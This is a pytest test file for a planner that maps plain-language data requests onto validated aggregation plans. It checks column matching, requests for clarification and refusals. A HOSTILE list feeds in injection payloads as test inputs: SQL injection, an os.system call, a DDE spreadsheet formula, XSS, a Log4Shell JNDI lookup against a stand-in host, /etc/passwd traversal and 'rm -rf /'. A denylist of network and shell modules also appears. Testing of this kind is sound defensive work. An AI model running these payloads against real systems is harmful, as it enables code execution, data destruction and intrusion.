"""Planner: supported, ambiguous, unsupported and hostile requests. Expected numbers are worked out by
hand from SALES (tests/unit/test_workspace_core.py), never copied from the code under test."""

from __future__ import annotations

import socket

import pytest
from test_workspace_core import SALES

from sie.datasets import open_dataset, profile
from sie.workspace import (
    ChartChange,
    NeedsClarification,
    Plan,
    Unsupported,
    plan_request,
    start_session,
)
from sie.workspace import planner as planner_module

OUTCOMES = (Plan, ChartChange, NeedsClarification, Unsupported)


def prof(data: bytes = SALES, name: str = "sales.csv"):
    from sie.datasets import Limits, LoadOptions

    return profile(open_dataset(data, name, LoadOptions(), Limits()))


P = prof()


def ask(text, profile_=P, current=None):
    return plan_request(text, profile_, current=current)


# ---- supported -----------------------------------------------------------------------------------
def test_compare_is_sum_by_group_and_says_so():
    out = ask("Compare revenue by region")
    assert isinstance(out, Plan)
    assert out.spec.op == "group_aggregate"
    assert out.spec.by == ["region"] and out.spec.metrics == ["revenue:sum"]
    assert out.chart == "bar" and out.x == "region" and out.y == "revenue:sum"
    assert any("compare" in n and "sum" in n for n in out.notes)


@pytest.mark.parametrize(
    ("text", "fn"),
    [
        ("Sum revenue by region", "sum"), ("total revenue by region", "sum"),
        ("Average revenue by region", "mean"), ("avg revenue by region", "mean"),
        ("mean revenue by region", "mean"), ("Median revenue by region", "median"),
        ("minimum revenue by region", "min"), ("max revenue by region", "max"),
        ("Sum of revenue by region", "sum"), ("  Sum   revenue  by region. ", "sum"),
        ("SUM REVENUE BY REGION!", "sum"),
    ],
)  # fmt: skip
def test_aggregate_verbs(text, fn):
    out = ask(text)
    assert isinstance(out, Plan)
    assert out.spec.metrics == [f"revenue:{fn}"]


def test_top_n():
    out = ask("Top 5 product by revenue")
    assert isinstance(out, Plan) and out.spec.op == "top_n"
    assert (out.spec.by, out.spec.metric, out.spec.n) == ("product", "revenue:sum", 5)
    assert out.chart == "bar"


def test_top_n_plural_group_name_is_not_guessed():
    # "products" is not a column; nothing singularises words
    out = ask("Top 5 products by revenue")
    assert isinstance(out, Unsupported) and "products" in out.reason
    assert "product" in out.available_columns


@pytest.mark.parametrize(
    ("unit", "freq"), [("month", "month"), ("day", "day"), ("quarter", "quarter"), ("year", "year")]
)
def test_time_units(unit, freq):
    for text in (f"Sum revenue by {unit}", f"Trend of revenue by {unit}"):
        out = ask(text)
        assert isinstance(out, Plan)
        assert out.spec.op == "time_trend" and out.spec.freq == freq
        assert out.spec.date_column == "sold_on" and out.spec.metric == "revenue:sum"
        assert out.chart == "line" and out.x == "period"
        assert any("sold_on" in n for n in out.notes)


def test_a_real_column_named_like_a_unit_wins():
    data = b"month,amount,d\nJan,5,2025-01-01\nFeb,7,2025-02-01\n"
    out = ask("Sum amount by month", prof(data, "m.csv"))
    assert isinstance(out, Plan) and out.spec.op == "group_aggregate" and out.spec.by == ["month"]


def test_chart_changes_need_a_current_plan():
    assert isinstance(ask("Show as bar chart"), Unsupported)
    cur = ask("Sum revenue by region")
    for kind in ("bar", "table"):
        out = ask(f"Show as {kind} chart" if kind == "bar" else f"Show as {kind}", current=cur)
        assert isinstance(out, ChartChange) and out.chart == kind
    assert isinstance(ask("Show as line chart", current=cur), Unsupported)  # not a time series
    trend = ask("Sum revenue by month")
    out = ask("Show as line chart", current=trend)
    assert isinstance(out, ChartChange) and out.chart == "line"
    assert (
        ask("please plot it as a table", current=cur).kind == "unsupported"
    )  # outside the grammar


# ---- column resolution --------------------------------------------------------------------------
def test_case_insensitive_match_is_visible():
    out = ask("sum REVENUE by Region")
    assert isinstance(out, Plan) and out.spec.by == ["region"]
    assert sum("ignoring upper/lower case" in n for n in out.notes) == 2


def test_exact_match_has_no_case_note():
    out = ask("Sum revenue by region")
    assert isinstance(out, Plan) and not any("case" in n for n in out.notes)


def test_two_columns_differing_by_case_need_clarification():
    data = b"Region,region,amount\nA,x,1\nB,y,2\n"
    pr = prof(data, "c.csv")
    out = ask("Sum amount by REGION", pr)
    assert_options_are_strict_plans(out, pr, lambda p: p.spec.by, [["Region"], ["region"]])
    exact = ask("Sum amount by Region", pr)
    assert isinstance(exact, Plan) and exact.spec.by == ["Region"]


def test_quoted_names_with_spaces_and_the_word_by():
    data = b"sold by,net revenue,k\nx,1,a\ny,2,b\n"
    pr = prof(data, "q.csv")
    for text in ('Sum "net revenue" by "sold by"', "Sum net revenue by sold by"):
        out = ask(text, pr)
        assert isinstance(out, Plan) and out.spec.by == ["sold by"]
        assert out.spec.metrics == ["net revenue:sum"]


def test_missing_column_lists_real_ones():
    out = ask("Sum sales by region")
    assert isinstance(out, Unsupported) and "sales" in out.reason
    assert out.available_columns == ("region", "product", "sold_on", "units", "revenue")


def test_text_measure_and_date_group_are_refused_with_the_reason():
    out = ask("Sum product by region")
    assert isinstance(out, Unsupported) and "text" in out.reason and "numbers" in out.reason
    out = ask("Sum revenue by sold_on")
    assert isinstance(out, Unsupported) and "date" in out.reason and "month" in out.reason
    assert isinstance(ask("Top 3 sold_on by revenue"), Unsupported)


def test_no_group_asks_instead_of_guessing():
    out = ask("Sum revenue")
    assert_options_are_strict_plans(
        out, P, lambda p: (p.spec.op, p.spec.by, p.spec.metrics), 
        [("group_aggregate", ["region"], ["revenue:sum"]), ("group_aggregate", ["product"], ["revenue:sum"])],
    )  # fmt: skip


def test_top_without_n_asks():
    out = ask("Top product by revenue")
    assert_options_are_strict_plans(
        out, P, lambda p: (p.spec.op, p.spec.by, p.spec.metric, p.spec.n),
        [("top_n", "product", "revenue:sum", n) for n in (3, 5, 10)],
    )  # fmt: skip


@pytest.mark.parametrize("n", ["0", "1001", "-3", "2.5", "٣"])
def test_top_n_bounds(n):
    assert isinstance(ask(f"Top {n} product by revenue"), (Unsupported, NeedsClarification))


def assert_options_are_strict_plans(out, pr, describe, expect):
    """Every offered option must itself be an unambiguous, valid Plan (not another clarification or an
    unsupported result), its spec distinct from every other option's, and ``describe(plan)`` (the part
    that differs: date column, group column, N ...) must equal ``expect`` in order."""
    assert isinstance(out, NeedsClarification)
    assert len(out.options) == len(expect) >= 2
    outcomes = [ask(o, pr) for o in out.options]
    assert [o.kind for o in outcomes] == ["plan"] * len(out.options), [o.kind for o in outcomes]
    assert len(outcomes) == len(out.options)
    assert [describe(p) for p in outcomes] == expect
    assert len({p.spec.model_dump_json() for p in outcomes}) == len(outcomes)


def test_several_date_columns_need_clarification():
    data = b"a,b,amount\n2025-01-01,2025-02-01,1\n2025-03-01,2025-04-01,2\n"
    pr = prof(data, "d.csv")
    for text in ("Sum amount by month", "Trend of amount by quarter"):
        out = ask(text, pr)
        assert_options_are_strict_plans(out, pr, lambda p: p.spec.date_column, ["a", "b"])
        assert not isinstance(out, Plan)  # the planner never picks a date column itself


def test_using_names_the_date_column():
    data = b"a,b,amount\n2025-01-01,2025-02-01,1\n2025-03-01,2025-04-01,2\n"
    pr = prof(data, "d.csv")
    out = ask("Sum amount by year using B", pr)
    assert isinstance(out, Plan) and out.spec.date_column == "b" and out.spec.freq == "year"
    assert any("ignoring upper/lower case" in n for n in out.notes)
    assert isinstance(ask("Sum amount by month using amount", pr), Unsupported)  # not a date
    assert isinstance(ask("Sum amount by month using nope", pr), Unsupported)
    assert isinstance(ask("Sum amount by week using a", pr), Unsupported)


def test_case_only_duplicate_date_columns_ask_with_strict_options():
    data = b"Date,date,amount\n2025-01-01,2025-02-01,1\n2025-03-01,2025-04-01,2\n"
    pr = prof(data, "dd.csv")
    out = ask("Sum amount by month using DATE", pr)
    assert_options_are_strict_plans(out, pr, lambda p: p.spec.date_column, ["Date", "date"])


def test_boolean_groups_are_kept_as_they_are():
    data = b"active,amount\ntrue,1\nfalse,2\ntrue,3\n"
    pr = prof(data, "b.csv")
    out = ask("Sum amount by active", pr)
    assert isinstance(out, Plan) and out.spec.by == ["active"]
    sess = start_session(data, "b.csv")
    step = sess.ask("Sum amount by active")
    assert step.kind == "plan"
    table = sess.items[0].result.table
    assert dict(zip(table["active"].astype(str), table["amount:sum"], strict=True)) == {
        "True": 4, "False": 2,
    }  # fmt: skip
    # the independent check does not cover boolean columns (slice 1 limit): never shown as verified
    assert step.verification == "unverified" and not sess.items[0].exportable


def test_top_n_ties_and_order_come_from_the_engine():
    from sie.datasets import Limits, LoadOptions, open_dataset, run_operation

    data = b"k,v\nb,5\na,5\nc,1\n"
    s = start_session(data, "t.csv")
    step = s.ask("Top 2 k by v")
    ds = open_dataset(data, "t.csv", LoadOptions(), Limits())
    direct = run_operation(ds, s.items[0].planned.spec)
    assert step.result_sha256 == direct.provenance.result_sha256
    assert s.items[0].result.table.equals(direct.table)


def test_no_date_column_is_unsupported():
    data = b"g,amount\na,1\nb,2\n"
    assert isinstance(ask("Sum amount by month", prof(data, "n.csv")), Unsupported)


@pytest.mark.parametrize("unit", ["week", "weekly", "hour"])
def test_unsupported_time_units(unit):
    assert isinstance(ask(f"Sum revenue by {unit}"), Unsupported)


def test_two_group_columns_unsupported():
    out = ask("Sum revenue by region and product")
    assert isinstance(out, Unsupported)
    assert isinstance(ask("Sum revenue by region, product"), Unsupported)


# ---- outside the grammar -------------------------------------------------------------------------
@pytest.mark.parametrize(
    "text",
    [
        "Why did revenue fall?", "Sum revenue by region where region is North",
        "Join sales with prices", "Sum revenue by region for 2025", "forecast revenue",
        "Correlate units and revenue", "hello", "Compare", "Top", "Sum by region",
    ],
)  # fmt: skip
def test_outside_the_grammar(text):
    out = ask(text)
    assert isinstance(out, (Unsupported, NeedsClarification))
    assert not isinstance(out, Plan)


def test_empty_and_non_text():
    for bad in ("", "   ", None, 5, b"Sum revenue by region", ["Sum revenue by region"]):
        assert isinstance(ask(bad), Unsupported)


def test_empty_dataset():
    pr = prof(b"a,b\n", "e.csv")
    assert isinstance(ask("Sum a by b", pr), Unsupported)


# ---- hostile input: text is only ever looked up among column names -------------------------------
HOSTILE = [
    "Sum revenue by region; DROP TABLE sales",
    "Sum revenue by region'; DROP TABLE sales; --",
    "Sum revenue by __import__('os').system('id')",
    "Sum __import__('os').getcwd() by region",
    "Sum revenue by region\x00",
    "Sum revenue by region\nSum units by product",
    "=cmd|' /C calc'!A0",
    "Sum revenue by <script>alert(1)</script>",
    "Sum revenue by ${jndi:ldap://evil/x}",
    "Sum revenue by region UNION SELECT * FROM users",
    "Sum revenue by rеgion",  # Cyrillic 'е'
    "Sum rev‮enue by region",
    "Sum " + "revenue " * 200 + "by region",
    "top 5 product by revenue; import os",
    "../../etc/passwd",
    "Show as bar chart; rm -rf /",
]


@pytest.mark.parametrize("text", HOSTILE)
def test_hostile_requests_never_plan_anything_but_a_valid_spec(text):
    out = ask(text, current=ask("Sum revenue by region"))
    assert isinstance(out, OUTCOMES)
    if isinstance(
        out, Plan
    ):  # only possible when the whole text was a grammar request on real columns
        assert out.spec.model_dump()  # validated typed spec
    if isinstance(out, Unsupported):
        assert "\x00" not in out.reason and "<script>" not in out.reason
        assert all(c.isprintable() for c in out.reason)
        assert len(out.reason) < 700


def test_lookalike_and_embedded_commands_do_not_match_columns():
    for text in HOSTILE[:11]:
        assert not isinstance(ask(text), Plan), text


def test_echoed_text_is_cut_and_single_line():
    out = ask("Sum " + "x" * 250 + " by region")
    assert isinstance(out, Unsupported) and len(out.reason) < 400
    out = ask("Sum rev​enue by region")
    assert isinstance(out, Unsupported)  # zero-width space inside a name is not the column
    assert planner_module.shown("a\nb\tc\x07d") == "a b c d"


def test_a_column_named_like_an_attack_is_just_data():
    data = b"x,DROP TABLE users;--,v\na,1,2\nb,3,4\n"
    pr = prof(data, "h.csv")
    out = ask('Sum "DROP TABLE users;--" by x', pr)
    assert isinstance(out, Plan) and out.spec.metrics == ["DROP TABLE users;--:sum"]
    s = start_session(data, "h.csv")
    step = s.ask('Sum "DROP TABLE users;--" by x')
    assert step.kind == "plan" and step.verification == "verified"


def test_planner_is_pure_and_offline(monkeypatch):
    def boom(*a, **k):  # any network use fails the test
        raise AssertionError("network")

    monkeypatch.setattr(socket, "socket", boom)
    monkeypatch.setattr(socket, "getaddrinfo", boom)
    first = ask("Sum revenue by region").to_dict()
    assert ask("Sum revenue by region").to_dict() == first


def test_planner_source_never_evaluates_text():
    import ast
    import inspect

    tree = ast.parse(inspect.getsource(planner_module))
    called = {
        n.func.id
        for n in ast.walk(tree)
        if isinstance(n, ast.Call) and isinstance(n.func, ast.Name)
    }
    assert not called & {"eval", "exec", "compile", "__import__", "open"}
    imported = {
        a.name.split(".")[0] for n in ast.walk(tree) if isinstance(n, ast.Import) for a in n.names
    }
    imported |= {
        n.module.split(".")[0] for n in ast.walk(tree) if isinstance(n, ast.ImportFrom) and n.module
    }
    assert not imported & {
        "os",
        "subprocess",
        "socket",
        "urllib",
        "requests",
        "httpx",
        "sqlite3",
        "pandas",
    }


def test_no_group_options_keep_the_users_measure_or_refuse():
    # the options must be about the measure the user named, never another column
    out = ask("Average units")
    assert_options_are_strict_plans(
        out,
        P,
        lambda p: (p.spec.by, p.spec.metrics),
        [(["region"], ["units:mean"]), (["product"], ["units:mean"])],
    )
    out = ask("Trend of revenue")
    assert_options_are_strict_plans(
        out, P, lambda p: (p.spec.date_column, p.spec.freq, p.spec.metric),
        [("sold_on", "day", "revenue:sum"), ("sold_on", "month", "revenue:sum")],
    )  # fmt: skip
    assert isinstance(ask("Sum nonexistent"), Unsupported)
    assert isinstance(ask("Sum product"), Unsupported)  # text measure
